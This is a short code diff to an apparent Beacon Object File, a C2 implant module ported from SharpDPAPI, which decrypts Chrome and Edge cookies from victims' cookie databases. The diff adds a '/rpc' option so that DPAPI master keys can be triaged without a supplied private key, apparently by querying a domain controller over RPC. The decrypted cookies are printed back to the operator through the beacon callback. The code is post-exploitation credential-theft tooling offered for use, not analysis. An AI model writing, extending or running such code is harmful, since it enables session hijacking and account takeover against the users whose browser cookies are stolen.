@@ -4,7 +4,7 @@
  * Usage:
  *   chrome_cookies [/pvk:BASE64] [/credkey:KEY] [/server:SERVER]
  *                  [/target:PATH] [/unprotect] [/statekey:HEX]
- *                  [/cookie:REGEX] [/url:REGEX]
+ *                  [/cookie:REGEX] [/url:REGEX] [/rpc]
  *
  * Decrypts Chrome/Edge cookies from Cookie database files.
  */
@@ -26,6 +26,7 @@ void go(char* args, int args_len) {
     char* cookie_regex = BeaconDataExtract(&parser, NULL);
     char* url_regex    = BeaconDataExtract(&parser, NULL);
     int   unprotect    = BeaconDataInt(&parser);
+    int   use_rpc      = BeaconDataInt(&parser);
 
     BYTE* pvk = NULL;
     int pvk_len = 0;
@@ -69,9 +70,9 @@ void go(char* args, int args_len) {
         }
     }
 
-    if (pvk) {
+    if (pvk || use_rpc) {
         triage_user_masterkeys(&cache, pvk, pvk_len,
-            NULL, NULL, NULL, FALSE, NULL, server, FALSE, NULL);
+            NULL, NULL, NULL, (BOOL)use_rpc, NULL, server, FALSE, NULL);
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Chrome Cookies (BOF) ===\n");
